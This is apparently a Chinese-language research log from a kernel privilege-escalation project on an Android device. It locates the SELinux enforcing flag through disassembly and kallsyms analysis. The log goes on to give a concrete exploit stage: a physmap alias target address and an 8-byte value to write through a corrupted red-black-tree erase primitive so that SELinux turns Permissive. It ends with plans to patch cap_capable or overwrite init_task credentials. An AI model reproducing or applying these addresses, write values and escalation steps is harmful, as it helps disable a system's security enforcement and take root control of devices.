# H84 三环对照表：`selinux_state.enforcing` 偏移定案

> 轮次：H84 · 日期：2026-10-04 21:45 – 22:10
> 规程：`D:\MEY-AN00-root-repro\MEY-AN00-exploit-prompt-v2.md`（唯一权威）
> 结论一句话：**本机有真实的 SELinux 运行时 enforcing 开关，写 0 即 Permissive；偏移已三环闭合。**

---

## 0. 结论

| 项 | 值 |
|---|---|
| `selinux_state`（kallsyms） | `0xffffffc0823ba418` |
| **`enforcing` 偏移** | **`selinux_state + 0x0`**（即符号地址本身，**第一个字节**） |
| **绝对地址（无 slide）** | **`0xffffffc0823ba418`** |
| **physmap 别名（可写域）** | **`0xffffff802a3ba418`** |
| 写入值 | `0x00`（1 字节） |
| 效果 | `getenforce` → `Permissive` |

**这条路线完全绕过 W1 桥接卡点**：stage0 命中即可直接打，无需 `misc_list` 挂钩成功。

---

## 1. 环① 源码推理

### 1.1 构建配置（决定性）

设备 `/proc/config.gz` 实测：

```
CONFIG_SECURITY_SELINUX_DEVELOP=y
```

⇒ r17 `security/selinux/include/security.h` 的 `DEVELOP` 分支是**活代码**：

```c
struct selinux_state {
#ifdef CONFIG_SECURITY_SELINUX_DEVELOP
	bool enforcing;          /* ← 目标 */
#endif
	bool initialized;
	bool policycap[__POLICYDB_CAP_MAX];
	bool android_netlink_route;
	bool android_netlink_getneigh;
	struct page *status_page;
	struct mutex status_lock;
	struct selinux_policy __rcu *policy;
	struct mutex policy_mutex;
} __randomize_layout;

static inline bool enforcing_enabled(void) { return READ_ONCE(selinux_state.enforcing); }
static inline void enforcing_set(bool v)    { WRITE_ONCE(selinux_state.enforcing, v); }
```

### 1.2 消费点：写 0 的效果

`security/selinux/avc.c` `avc_denied()`：

```c
if (enforcing_enabled() &&
    !(avd->flags & AVD_FLAGS_PERMISSIVE))
	return -EACCES;      /* ← enforcing=0 ⇒走 avc_update_node(GRANT) ⇒返回 0 = 放行 */
```

⇒ 写 `enforcing = 0` 后，所有 AVC 拒绝变审计 ⇒ **Permissive**。

### 1.3 官方写路径（本项目无法用，但可作为语义基准）

`security/selinux/selinuxfs.c` `sel_write_enforce()`：读 `enforcing_enabled()` → 比对新值 →
`avc_has_perm(SECURITY__SETENFORCE)` → `audit_log(AUDIT_MAC_STATUS)` → `enforcing_set(new_value)`
→ `selinux_status_update_setenforce()`。

### 1.4 `__randomize_layout` 判定

`__POLICYDB_CAP_MAX = 8`（`policycap.h` 枚举 8 项）。
若结构体被随机化，`policycap[8]` 这 8 个连续 byte-store 不会连续紧跟两个 bool。
实测它们**恰好**位于 `+0x2 .. +0x9` ⇒ **布局未随机化**，字段严格按声明顺序。

---

## 2. 环② 汇编交叉验证（Image-mey）

### 2.1 方法（两次踩坑后定型的可靠流程）

| 步骤 | 做法 |
|---|---|
| ①定位符号页 | 手写 **AArch64 ADRP 位域解码**扫全 Image，找 `adrp xN, #0xffffffc0823ba000` ⇒ **45 处** |
| ②寄存器跟踪 | 从每处 adrp 起向后跟踪 `add/sub #imm` · `mov reg,reg`，求「相对 `selinux_state` 的偏移」 |
| ③byte-store 定案 | 全 .text 扫 `strb/stlrb/sturb` 到该页 ⇒ 唯一命中 `page+0x419` |
| ④符号归属 | kallsyms 二分查找所属函数，排除同名/相邻误判 |

**踩坑记录（重要方法论）**：

1. capstone 的 `op_str` 对 `adrp` 给出的形式与我假设不符 ⇒ 7.6 M 条 0 命中。
   **改为手写位域解码后立刻 45 处命中**。位域公式：
   `imm21 = (immhi<<2)|immlo`，`immhi=w>>5&0x7FFFF`，`immlo=w>>29&3`，
   `target_page = (PC & ~0xFFF) + (imm21<<12)`（`imm21` 需 21 位符号扩展）。
   **自检组**：`init_task` 页（`0x217e000`）命中 13 处 > 0 ⇒ 解码器正确（铁律⑲）。
2. `ldarb/stlrb/ldaddal/stadd` 等 **LSE 原子指令**不在常规 mem-op 助记符表里 ⇒ 必须补全。
3. `add xA,xB,#0x419` 已把页内偏移折进基址，后续常是**无立即数**形式 `ldarb w8,[x8]` ⇒
   偏移正则必须允许 imm 缺省，否则全漏。
4. `mov x19,x8` 这类寄存器复制必须跟踪，否则后续 `strb [x19]` 丢失。

### 2.2 `enforcing = ss+0` 的直接铁证（`sel_write_enforce`）

kallsyms 归属：`sel_write_enforce @0xffffffc08080b968`（+0x144 处）：

```asm
0xffffffc08080ba30  adrp  x24, #0xffffffc0823ba000
0xffffffc08080ba34  ldrb  w22, [x24, #0x418]     ; ★ old_value = enforcing_enabled()
0xffffffc08080ba38  cmp   w23, #0
0xffffffc08080ba3c  cset  w21, ne               ; ★ new_value = !!scan_value
0xffffffc08080ba40  cmp   w22, #0
0xffffffc08080ba44  cset  w8, ne
0xffffffc08080ba48  cmp   w21, w8
0xffffffc08080ba4c  b.eq  0xffffffc08080ba90    ;   if (new_value == old_value) skip
        ...  avc_has_perm(SECINITSID_SECURITY, SECCLASS_SECURITY, SECURITY__SETENFORCE) ...
        ...  audit_log(AUDIT_MAC_STATUS, ...) ...
0xffffffc08080bac4  cset  w25, ne
0xffffffc08080bacc  strb  w25, [x24, #0x418]    ; ★ enforcing_set(new_value)
0xffffffc08080bad0  cbz   w23, ...              ;   if (new_value) avc_ss_reset(0)
0xffffffc08080bae8  bl    #0xffffffc0808108c4   ;   selinux_status_update_setenforce(1)
```

**逐行对照源码 `sel_write_enforce()`，顺序、分支、数值全部一一对应**。
`#0x418` 相对 `adrp` 页基址正好是 `0x0` ⇒ **`enforcing` 偏移 = 0x0**。

### 2.3 完整字段布局（与源码声明顺序 100% 吻合）

以页基址 `P = 0xffffffc0823ba000` 表示，`ss = P + 0x418`：

| 偏移 (ss+) | 地址 | 源码字段 | 汇编证据 | 次数 |
|---|---|---|---|---|
| **+0x0** | `0xffffffc0823ba418` | **`bool enforcing`** | `sel_write_enforce` 的 `ldrb`/`strb` 对（**写入点 `stlrb` 见 2.4**） | — |
| +0x1 | `0xffffffc0823ba419` | `bool initialized` | `ldarb`（= `smp_load_acquire`） | 9 |
| +0x2..+0x9 | `0x…41a`–`0x…421` | `bool policycap[8]` | 8 个连续 `strb [x23,+0..7]` | 8 |
| +0xa | `0xffffffc0823ba422` | `bool android_netlink_route` | `strb w8,[x22,#9]`（x22 = ss+1） | 1 |
| +0xb | `0xffffffc0823ba423` | `bool android_netlink_getneigh` | `strb w8,[x22,#0xa]` | 1 |
| +0x48 | `0xffffffc0823ba460` | 指针区（`status_page`/`policy`） | `ldr x8,[x8,#0x460]` | 13 |

`__POLICYDB_CAP_MAX == 8`（`policycap.h`：NETPEER/OPENPERM/EXTSOCKCLASS/ALWAYSNETWORK/
CGROUPSECLABEL/NNP_NOSUID_TRANSITION/GENFS_SECLABEL_SYMLINKS/IOCTL_SKIP_CLOEXEC）
⇒ **8 个连续 byte-store 精确对上**，布局偏移量无一处含糊。

### 2.4 第二个写入点（`selinux_policy_commit`，`SELINUX_COMMIT_ENABLE`）

kallsyms 归属 `selinux_policy_commit @0xffffffc08080df38`（+0x384）：

```asm
0xffffffc08080e288  adrp  x22, #0xffffffc0823ba000
0xffffffc08080e28c  add   x22, x22, #0x419        ; x22 = ss + 0x1 = initialized
0xffffffc08080e290  cmp   w8, #0
0xffffffc08080e294  cset  w8, ne
0xffffffc08080e298  cmp   w9, #0
0xffffffc08080e29c  strb  w8, [x22, #9]           ; ss+0xa android_netlink_route
0xffffffc08080e2a0  cset  w8, ne
0xffffffc08080e2a4  strb  w8, [x22, #0xa]         ; ss+0xb android_netlink_getneigh
0xffffffc08080e2a8  bl    #0xffffffc080a9a8cc     ; selinux_policydb_free / reload
0xffffffc08080e2ac  ldarb w8, [x22]               ; 读 ss+0x1 initialized
0xffffffc08080e2b0  tbnz  w8, #0, 0xffffffc08080e2cc
0xffffffc08080e2b4  mov   w8, #1
0xffffffc08080e2b8  adrp  x9, #0xffffffc0823ba000
0xffffffc08080e2bc  add   x9, x9, #0x419
0xffffffc08080e2c0  stlrb w8, [x9]                ; ★★ 唯一 stlrb（WRITE_ONCE）→ ss+0x1
```

⚠️ **注意**：这处 `stlrb` 写的是 `initialized`（`selinux_mark_initialized()`），**不是** enforcing。
`enforcing_set()` 内联在 `sel_write_enforce` 里被编译成普通 `strb`（无 `WRITE_ONCE` 屏障，因单字节）。
⇒ **写 enforcing 的 8 字节 qword 窗口会覆盖 `initialized`**，见 §5 风险。

### 2.5 读点（9 处 `ldarb` / `ldrb` @ ss+0x1）—— 全是 `initialized`

| pc | kallsyms 归属 | 形态 |
|---|---|---|
| `0xffffffc0801f14b4` | `selinux_set_mnt_opts` | `ldarb w8,[x8]` + 后续 4 次 `ldr` |
| `0xffffffc08080d714` | `security_mls_enabled` | `ldarb w8,[x8]` + `tbnz` |
| `0xffffffc08080d888` | `security_bounded_transition` | `ldarb w8,[x8]` + `tbnz` |
| `0xffffffc08080dabc` | `security_sidtab_hash_stats` | `ldarb w8,[x8]` + `tbz` |
| `0xffffffc080086730` | `selinux_binder_transfer_file` | `ldarb w12,[x12]` + `tbz` |
| `0xffffffc080086bf0` / `0x86d00` | `selinux_inode_follow_link` | `ldarb` + `tbz` |
| `0xffffffc08080d754` | `services_compute_xperms_drivers` | `ldrb w9,[x8]`（+随后 `ldrb w8,[x8,#1]` 读 ss+0x2） |

全部位于 LSM hook / selinuxfs / netlink 路径 ⇒ 与 `selinux_initialized()` 的调用分布一致。

---

## 3. 环③ Image 逻辑推理

`selinux_state` 在 `.bss`（`0x23ba418` > `.text` 尾 `0x1d00000`），符号由 kallsyms 给出、
与源码 `DEFINE_IDR`/`EXPORT_SYMBOL`-风格全局一致，**本轮无需 img delta 分析**
（前三轮 H80 用 delta 法定位 `cap_capable` 首字节，本轮符号直接可用）。

KASLR slide 每 boot 变 ⇒ 运行时地址必须 `LINK_SELINUX_STATE + kernel_slide`。
`kernel_slide` 由 stage0 命中时的 `BOOTID_WRITE_PASS` 日志 `slide=` 字段给出（已验证可靠）。

---

## 4. 对既有结论的修正（重要）

| 旧结论 | 状态 | 修正 |
|---|---|---|
| MEMORY H34：「改 `selinux_state` 已判死 —— 运行时 enforcing 开关被上游移除」 | ❌ **推翻** | 本机 `CONFIG_SECURITY_SELINUX_DEVELOP=y`，开关真实存在 |
| MEMORY §5「已判死：改 `selinux_state`(运行时关被上游移除)」 | ❌ **推翻** | 同上 |
| MEMORY §5「唯一统一瓶颈 = SELinux」 | ✅ 仍成立 | 但现在有了绕过手段 |
| skill `magicpad3-root-handoff` 的 `SELINUX_ROUTE`（CGA-W00 单发写 `enforcing=0` 拿 Permissive） | ✅ **跨设备互证** | 本机偏移与机制完全同构 |

---

## 5. 落地设计（H84 补丁）与风险

### 5.1 写原语约束

stage0 的写是 **rb_erase Path A**：`*(u64*)forged_parent = forged_child`
⇒ **写宽度固定 8 字节**，无法只写 1 字节。

目标地址落在 **physmap 直映射别名**（DM 域可写，铁律⑮已双 boot 实证）：

```
alias(enforcing) = DIRECT_MAP_BEGIN + (LINK_SELINUX_STATE − LINK_IMAGE_BASE) + MEY_PHYS_DELTA
                 = 0xffffff8000000000 + 0x23ba418 + 0x28000000
                 = 0xffffff802a3ba418
```

### 5.2 8 字节写入值的取值（关键设计）

小端 8 字节写入 `ss+0` 会覆盖 `+0x0..+0x7` = `enforcing | initialized | policycap[0..5]`：

| 方案 | 值 | enforcing | initialized | policycap[0..5] | 评价 |
|---|---|---|---|---|---|
| A 全 0 | `0x0000000000000000` | ✅ 0 | ⚠️ **0** | ⚠️ 全 0 | `selinux_initialized()` 返回 false ⇒大量 hook 提前放行，但个别路径可能 NULL deref |
| **B（推荐）** | **`0x0000000000000100`** | ✅ 0 | ✅ **1**（原值） | ⚠️ 全 0 | 破坏面最小；policycap 8 项全清不影响 enforcing 判定（r17 无 `POLICYDB_CAP_PERMISSIVE`） |
| C 保 policycap | 需先读原值再回写 | ✅ 0 | ✅ 1 | ✅ 保留 | 需 stage0 前置读通道，当前无独立读源⇒ 本轮不做 |

⇒ **取方案 B，写值 `0x0000000000000100`**。

### 5.3 判据（严格遵守铁律㉗ 独立通道）

stage0 原判据是 `read_boot_id() == forged_parent`，新模式下**必然失效**
（写 `0x100` 后 `ctl_table.data` 指向非法 physmap，`proc_do_uuid` 走不通）。
⇒ 新判据只用内核权威接口，**不依赖 `kernel_read_virtual`**：

| 通道 | 期望 |
|---|---|
| `adb shell getenforce` | `Permissive` |
| `cat /sys/fs/selinux/enforce` | `0` |
| `/sys/fs/selinux/checkreqprot` | `16` |

### 5.4 剩余风险

1. **`policycap` 清零**：8 项 capability 全清。r17 中 `policydb_has_capability()` 用于
   NETPEER / OPENPERM / EXTSOCKCLASS / CGROUPSECLABEL / NNP_NOSUID_TRANSITION /
   GENFS_SECLABEL_SYMLINKS / IOCTL_SKIP_CLOEXEC / ALWAYSNETWORK，
   均为「策略是否声明支持某增强」的查询；清零后内核走 fallback 路径，**预期不崩**，
   但需上机验证。
2. **stage0 命中率仍是 1/127**：平均 127 个 boot 才进一次。这是所有路线的共同瓶颈，
   与 enforcing 偏移无关。
3. **写原语窗口 8 字节**：无法避免（见 5.1）。
4. 若设备在写后立刻重启 ⇒ 说明踩到了 `policycap` 相关路径，需回退方案 C
   （先读 `policycap` 原值再回写），但那需要独立读通道。

---

## 6. 本轮产物

| 文件 | 说明 |
|---|---|
| `analysis/scratch/h84_adrp_decode.py` | **手写 ADRP 位域解码器**（含 init_task 自检组）—— 可复用于任何全局符号定位 |
| `analysis/scratch/h84_selinux_offset.py` | 偏移反推（早期版本，imm 缺省 bug） |
| `analysis/scratch/h84_dump_refs.py` | 命中点原始反汇编 dump |
| `analysis/scratch/h84_enforcing_confirm.py` | 偏移 + 读写分类（寄存器 key 类型 bug 已修） |
| `analysis/scratch/h84_enforcing_final.py` | 完整字段偏移表（含 policycap 证据） |
| `analysis/scratch/h84_enforcing_write.py` | + `mov` 跟踪找写入点 |
| `analysis/scratch/h84_add419.py` | `add #0x419` 位域扫描 |
| `analysis/scratch/h84_store_scan.py` | ★ 全 .text byte-store 扫描（找到唯一 `stlrb`） |
| `analysis/scratch/h84_sym_owner.py` | kallsyms 符号归属 |
| `analysis/scratch/h84_crosscheck.py` | ★ V1 `sel_write_enforce` 逐行对照（决定性） |
| `analysis/output/h84_selinux_enforcing.md` | 本文档 |

---

## 7. 下一轮待办

1. **H85 补丁**：新增 `MEY_STAGE0_SELINUX_TARGET=1`
   - `forged_parent = 0xffffff802a3ba418`（physmap 别名）
   - `forged_child  = 0x0000000000000100`
   - 判据切到 `getenforce` / `/sys/fs/selinux/enforce`
   - **同时必须关闭 stage0 之后的 stageB/W1 流程**（新目标不产生 misc bridge）
2. 单发脚本 `h81_single.sh` 复用，只改 env。
3. 成败都回填 `MEMORY.md` / `HANDOFF.md` / `2026-10-04.md`。
4. 若拿到 Permissive：下一步走 `cap_capable` NOP（H49 `probe_text_write`，代码已就位）
   或 `init_task.cred` 两段式改写。

---

## 8. 新增铁律

**㉚ 定位全局符号偏移时，手写 AArch64 位域解码优于 capstone `op_str` 文本解析。**
capstone 的 `adrp` `op_str` 形式与预期不符会导致「7.6 M 条 0 命中」的假阴性；
`imm21 = (w>>5&0x7FFFF)<<2 | (w>>29&3)` + `(PC&~0xFFF) + (imm21<<12)` 是确定性公式，
且必须带**阳性自检组**（已知一定存在的符号页）才算通过。

**㉛ 扫描结构体字段时必须补全 LSE 原子指令助记符**
（`ldarb/stlrb/ldaddal/stadd/casal/swp/ldxr/stxr/ldaxr/stlxr` …），
且必须跟踪 `mov reg,reg` 与**无立即数的内存操作数形态**（`ldarb w8,[x8]`），
否则会静默漏掉全部读写点。

**㉜ `__randomize_layout` 是否生效可由「字段字节数 vs 实测连续 byte-store 数」判定。**
本例 `policycap[8]` 恰好 8 个连续 `strb` 且紧跟 2 个 bool ⇒ 未随机化，偏移可直接按声明顺序推。